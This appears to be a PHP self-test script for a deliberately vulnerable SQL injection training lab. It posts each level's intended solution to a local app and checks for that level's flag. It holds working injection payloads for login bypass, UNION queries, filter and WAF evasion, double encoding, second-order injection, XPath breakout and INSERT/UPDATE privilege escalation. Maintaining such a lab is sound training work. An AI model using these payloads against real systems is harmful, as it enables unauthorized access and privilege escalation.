<?php
/**
 * SQLi Lab self-test: runs the intended solution for every level against the
 * live app, so a level that has quietly stopped being solvable is caught.
 *
 *   docker compose exec web php /var/www/html/solve_check.php
 */
require_once __DIR__ . '/includes/helpers.php';

$base = 'http://localhost';
$pass = 0;
$fail = 0;

function post(string $url, array $fields): string
{
    $ctx = stream_context_create(['http' => [
        'method'  => 'POST',
        'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content' => http_build_query($fields),
        'timeout' => 30,
        'ignore_errors' => true,
    ]]);
    return (string)@file_get_contents($url, false, $ctx);
}

/** POST without re-encoding: some payloads must arrive percent-encoded. */
function post_raw(string $url, string $body): string
{
    $ctx = stream_context_create(['http' => [
        'method'  => 'POST',
        'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content' => $body,
        'timeout' => 30,
        'ignore_errors' => true,
    ]]);
    return (string)@file_get_contents($url, false, $ctx);
}

function check(int $level, string $body, string $note = ''): void
{
    global $pass, $fail;
    $want = get_flag_for_level($level);
    if ($want !== '' && strpos($body, $want) !== false) {
        $pass++;
        printf("  PASS  level %-2d %s%s\n", $level, $want, $note !== '' ? "  ($note)" : '');
    } else {
        $fail++;
        printf("  FAIL  level %-2d expected %s%s\n", $level, $want, $note !== '' ? "  ($note)" : '');
    }
}

echo "SQLi Lab self-test\n------------------\n";

/* 1 - authentication bypass, comment out the password test */
check(1, post("$base/level1.php", ['username' => "admin' -- x", 'password' => 'x']), 'comment bypass');

/* 2 - same bypass; the UNION is the lesson, the login is the gate */
check(2, post("$base/level2.php", ['user_id' => "0 UNION SELECT 1,'admin','admin'-- x", 'password' => '']), 'union into a numeric context');

/* 3 - stacked queries: the pre-check needs a real user first */
check(3, post("$base/level3.php", ['username' => "admin' -- x", 'password' => 'x']), 'stacked');

/* 4 - WAF: no blocked keyword, still true */
check(4, post("$base/level4.php", ['username' => 'x', 'password' => "p'||'1"]), 'pipe, and never names admin');

/* 5 - boolean blind: the count only has to be non-zero */
check(5, post("$base/level5.php", ['username' => "admin' -- x", 'password' => 'x']), 'boolean');

/* 6 - time based */
check(6, post("$base/level6.php", ['username' => "admin' -- x", 'password' => 'x']), 'time based');

/* 7 - OUTFILE level */
check(7, post("$base/level7.php", ['username' => "admin' -- x", 'password' => 'x']), 'file based');

/* 8 - second order: register a payload, then log in with it */
$u = 'so' . substr(md5((string)mt_rand()), 0, 6);
// The quote has to be doubled so the registration INSERT still parses; what
// gets STORED is the payload that statement 2 will concatenate.
post("$base/level8.php?mode=register", ['username' => $u, 'password' => 'p', 'email' => "x'' OR role=''admin"]);
check(8, post("$base/level8.php?mode=login", ['username' => $u, 'password' => 'p']), 'stored then reused');

/* 9 - XPath predicate breakout */
check(9, post("$base/level9.php", ['username' => "admin' or '1'='1", 'password' => "x' or '1'='1"]), 'xpath');

/* 10 - INSERT: write your own VALUES list */
$u = 'ins' . substr(md5((string)mt_rand()), 0, 6);
check(10, post("$base/level10.php", [
    'username' => "$u', 'p', 'e@e.test', 'admin')-- x",
    'email' => 'e@e.test', 'fullname' => 'f', 'phone' => '1',
]), 'values list rewritten');

/* 11 - UPDATE: add an assignment the form never offered */
check(11, post("$base/level11.php", [
    'email' => "a@b.test', role = 'admin", 'phone' => '1', 'bio' => 'b', 'website' => 'w',
]), 'set list');

/* 12 - JSON fields reach the statement unescaped */
check(12, post("$base/level12.php", [
    'json_data' => '{"username":"admin","password":"x\' or \'1\'=\'1","role":"admin"}',
]), 'json');

/* 13 - comments blocked, so satisfy the tail instead */
check(13, post("$base/level13.php", ['username' => "admin' or '1'='1", 'password' => 'x']), 'no comment needed');

/* 14 - filter runs before the decoders */
check(14, post_raw("$base/level14.php", 'username=admin%2527%7C%7C%25271&password=x'), 'double encoded');

/* 15 - no spaces required */
check(15, post("$base/level15.php", ['username' => "admin'||'1", 'password' => 'x']), 'no whitespace');

/* 16 - five layers, none of them covering the pipe */
check(16, post("$base/level16.php", ['username' => "admin'||'1", 'password' => 'x']), 'pipe as OR');

echo "------------------\n$pass passed, $fail failed\n";
exit($fail === 0 ? 0 : 1);
